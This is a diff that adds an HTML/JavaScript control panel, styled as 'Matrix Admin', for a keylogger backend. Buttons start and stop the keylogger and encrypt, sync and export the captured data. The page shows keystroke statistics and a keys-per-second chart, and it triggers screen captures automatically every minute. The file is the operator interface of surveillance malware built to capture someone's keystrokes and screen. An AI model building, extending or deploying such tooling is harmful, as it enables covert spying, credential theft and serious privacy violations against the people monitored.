@@ -1,0 +1,260 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>Matrix Admin — Real-time</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+  <style>
+    :root{--neon:#00ff6a;--neon-2:#00e0ff;--bg:#000;--panel:#06110a}
+    *{box-sizing:border-box;margin:0;padding:0;font-family:'Share Tech Mono',monospace}
+    html,body{height:100%;background:var(--bg);color:var(--neon);overflow:hidden}
+    #matrix{position:fixed;inset:0;z-index:0}
+    .app{position:relative;z-index:2;display:grid;grid-template-columns:1fr 420px;gap:18px;height:100vh;padding:28px;align-items:start}
+    .main{backdrop-filter:blur(2px);background:linear-gradient(180deg,rgba(0,0,0,.35),rgba(0,0,0,.45));border:1px solid rgba(0,255,106,.12);border-radius:12px;padding:18px;box-shadow:0 8px 40px rgba(0,255,106,.03);display:flex;flex-direction:column;gap:14px}
+    .header{display:flex;justify-content:space-between;align-items:center}
+    .title{font-size:20px;color:var(--neon);text-shadow:0 0 8px rgba(0,255,106,.12)}
+    .controls{display:flex;gap:8px;align-items:center}
+    button{background:transparent;color:var(--neon);border:1px solid rgba(0,255,106,.25);padding:8px 12px;border-radius:7px;cursor:pointer;transition:all .15s;font-size:13px}
+    button:hover{transform:translateY(-2px);box-shadow:0 6px 18px rgba(0,255,106,.06);background:rgba(0,255,106,.03)}
+    button:disabled{opacity:0.5;cursor:not-allowed}
+    .small{padding:6px 10px}
+    .card-row{display:flex;gap:12px;flex-wrap:wrap}
+    .card{background:linear-gradient(180deg,rgba(0,0,0,.35),rgba(0,0,0,.5));border:1px solid rgba(0,255,106,.08);padding:12px;border-radius:10px;min-width:120px;display:flex;flex-direction:column;gap:6px}
+    .card .num{font-size:20px;color:var(--neon-2)}
+    .muted{color:#7fffd42a;font-size:12px}
+    .chart-wrap{margin-top:8px;background:linear-gradient(180deg,rgba(0,0,0,.15),rgba(0,0,0,.25));border-radius:10px;padding:12px;border:1px solid rgba(0,255,106,.06)}
+    .side{display:flex;flex-direction:column;gap:12px}
+    .panel{background:linear-gradient(180deg,rgba(0,0,0,.35),rgba(0,0,0,.5));border-radius:10px;padding:10px;border:1px solid rgba(0,255,106,.06)}
+    #terminal{height:68vh;overflow:auto;font-size:12px;line-height:1.4;padding:12px;border-radius:8px;background:rgba(0,0,0,.55);border:1px solid rgba(0,255,106,.04)}
+    .log-line{white-space:pre-wrap;color:var(--neon);margin-bottom:6px;opacity:.95}
+    .log-line.info{color:#00bfff}
+    .log-line.warn{color:#ffd166}
+    .flash{animation:flash 600ms ease-in-out}
+    @keyframes flash{0%{box-shadow:0 0 0 0 rgba(0,255,106,.45)}60%{box-shadow:0 0 18px 6px rgba(0,255,106,.06)}100%{box-shadow:0 0 0 0 rgba(0,255,106,0)}}
+    @media(max-width:980px){.app{grid-template-columns:1fr}#terminal{height:40vh}}
+  </style>
+</head>
+<body>
+<canvas id="matrix"></canvas>
+
+<div class="app">
+  <div class="main panel">
+    <div class="header">
+      <div><div class="title">Matrix Admin • Real-time</div></div>
+      <div class="controls">
+        <button id="startBtn">Start</button>
+        <button id="stopBtn" disabled>Stop</button>
+        <button id="captureBtn" class="small">Screenshot</button>
+        <button id="encryptBtn" class="small">Encrypt</button>
+        <button id="syncBtn" class="small">Sync</button>
+        <button id="exportBtn" class="small">Export CSV</button>
+      </div>
+    </div>
+
+    <div class="card-row">
+      <div class="card"><div class="muted">Total Keys</div><div class="num" id="totalKeys">0</div></div>
+      <div class="card"><div class="muted">Most Common</div><div class="num" id="mostCommon">-</div></div>
+      <div class="card"><div class="muted">Status</div><div class="num" id="keyStatus">stopped</div></div>
+    </div>
+
+    <!-- LINE GRAPH -->
+    <div class="chart-wrap">
+      <canvas id="activityChart" height="180"></canvas>
+    </div>
+  </div>
+
+  <div class="side">
+    <div class="panel">
+      <div style="font-weight:700;margin-bottom:8px">Live Terminal</div>
+      <div id="terminal" aria-live="polite"></div>
+    </div>
+    <div class="panel">
+      <div>Screenshot: <span id="screenshotStatus">—</span></div>
+      <img id="latestScreenshot" style="display:none;max-width:100%;margin-top:8px;border-radius:6px;" alt="latest">
+    </div>
+  </div>
+</div>
+
+<script>
+
+
+const matrix = document.getElementById('matrix');
+const mctx = matrix.getContext('2d');
+function resize(){ matrix.width = window.innerWidth; matrix.height = window.innerHeight; initDrops(); }
+window.addEventListener('resize', resize);
+const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()';
+const fontSize = 14;
+let columns, drops;
+function initDrops(){ columns = Math.floor(window.innerWidth/fontSize); drops = new Array(columns).fill(1); }
+resize();
+function drawMatrix(){
+  mctx.fillStyle = 'rgba(0,0,0,0.06)'; mctx.fillRect(0,0,matrix.width,matrix.height);
+  mctx.fillStyle = '#00ff6a'; mctx.font = fontSize+'px monospace';
+  for(let i=0;i<drops.length;i++){
+    const text = letters[Math.floor(Math.random()*letters.length)];
+    mctx.fillText(text, i*fontSize, drops[i]*fontSize);
+    if(drops[i]*fontSize > matrix.height && Math.random()>0.98) drops[i]=0;
+    drops[i]++;
+  }
+}
+setInterval(drawMatrix,45);
+
+
+const ALERTS_URL = '/api/alerts';
+const ACTIVITY_URL = '/api/activity';
+const START_URL = '/toggle_keylogger';
+const EXPORT_URL = '/export_alerts';
+const SCREENSHOT_URL = '/take_screenshot';
+const ENCRYPT_URL = '/encrypt_logs';
+const SYNC_URL = '/sync_data';
+const KEY_URL = '/data/encrypted/key.bin';
+
+
+const terminal = document.getElementById('terminal');
+let lastAlertCount = 0;
+let noAlertTimer = null;
+
+function log(msg, cls='') {
+  const line = document.createElement('div');
+  line.className = 'log-line ' + cls;
+  line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+  terminal.appendChild(line);
+  terminal.scrollTop = terminal.scrollHeight;
+  line.classList.add('flash');
+}
+
+
+let running = false;
+document.getElementById('startBtn').onclick = async () => {
+  await fetch(START_URL, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({action:'start'})});
+  running = true;
+  document.getElementById('startBtn').disabled = true;
+  document.getElementById('stopBtn').disabled = false;
+  document.getElementById('keyStatus').textContent = 'running';
+  log('Keylogger STARTED');
+};
+document.getElementById('stopBtn').onclick = async () => {
+  await fetch(START_URL, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({action:'stop'})});
+  running = false;
+  document.getElementById('startBtn').disabled = false;
+  document.getElementById('stopBtn').disabled = true;
+  document.getElementById('keyStatus').textContent = 'stopped';
+  log('Keylogger STOPPED');
+};
+
+
+async function updateStats() {
+  const res = await fetch('/api/stats');
+  const d = await res.json();
+  document.getElementById('totalKeys').textContent = d.total_keys || 0;
+  document.getElementById('mostCommon').textContent = d.most_common || '-';
+}
+
+
+let activityChart;
+async function loadActivity() {
+  const res = await fetch(ACTIVITY_URL);
+  const {data} = await res.json();
+  const labels = Array.from({length: 60}, (_, i) => -59 + i);
+  const ctx = document.getElementById('activityChart').getContext('2d');
+  if (!activityChart) {
+    activityChart = new Chart(ctx, {
+      type: 'line',
+      data: { labels, datasets: [{ label: 'Keys/sec', data, borderColor: '#00ffcc', backgroundColor: 'rgba(0,255,204,0.1)', fill: true, tension: 0.4, pointRadius: 0, borderWidth: 2 }] },
+      options: { responsive: true, animation: false, scales: { x: { display: false }, y: { beginAtZero: true, suggestedMax: 20 } }, plugins: { legend: { display: false } } }
+    });
+  } else {
+    activityChart.data.datasets[0].data = data;
+    activityChart.update('none');
+  }
+}
+
+
+async function loadAlerts() {
+  const res = await fetch(ALERTS_URL);
+  const {alerts} = await res.json();
+  const lines = alerts.split('\n').filter(Boolean);
+  const currentCount = lines.length;
+
+  
+  const existing = [...terminal.querySelectorAll('.log-line')].map(el => el.textContent);
+  lines.forEach(line => {
+    const txt = `[${new Date().toLocaleTimeString()}] ${line}`;
+    if (!existing.includes(txt)) {
+      const isAlert = line.includes('[ALERT]');
+      log(line, isAlert ? 'warn' : '');
+    }
+  });
+
+  
+  if (currentCount > lastAlertCount) {
+    lastAlertCount = currentCount;
+    if (noAlertTimer) clearTimeout(noAlertTimer);
+    startNoAlertTimer();
+  }
+}
+
+function startNoAlertTimer() {
+  if (noAlertTimer) clearTimeout(noAlertTimer);
+  noAlertTimer = setTimeout(() => {
+    log('No alerts in the last minute', 'info');
+    startNoAlertTimer(); 
+  }, 60000);
+}
+
+
+async function autoScreenshot() {
+  const status = document.getElementById('screenshotStatus');
+  status.textContent = 'Auto-capturing...';
+  const r = await fetch(SCREENSHOT_URL, {method:'POST'});
+  const j = await r.json();
+  if (j.status.includes('data/screenshots')) {
+    
+    status.textContent = 'Auto-saved';
+    log('Auto screenshot taken'); 
+  } else {
+    status.textContent = 'Auto-failed';
+  }
+}
+
+
+setInterval(autoScreenshot, 60000);
+
+
+document.getElementById('captureBtn').onclick = autoScreenshot;
+
+document.getElementById('encryptBtn').onclick = async () => {
+  const r = await fetch(ENCRYPT_URL, {method:'POST'});
+  const j = await r.json();
+  log(j.status);
+  if (j.status.includes('encrypted')) {
+    const a = document.createElement('a');
+    a.href = KEY_URL; a.download = 'key.bin'; a.click();
+  }
+};
+
+document.getElementById('syncBtn').onclick = async () => {
+  const r = await fetch(SYNC_URL, {method:'POST'});
+  const j = await r.json();
+  log(j.status);
+};
+
+document.getElementById('exportBtn').onclick = () => {
+  window.location.href = EXPORT_URL;
+};
+
+
+async function refreshAll() {
+  await Promise.all([updateStats(), loadAlerts(), loadActivity()]);
+}
+setInterval(refreshAll, 10000);
+window.addEventListener('load', () => {
+  refreshAll();
+  startNoAlertTimer();
+  autoScreenshot(); 
+});
+</script>
+</body>
+</html>
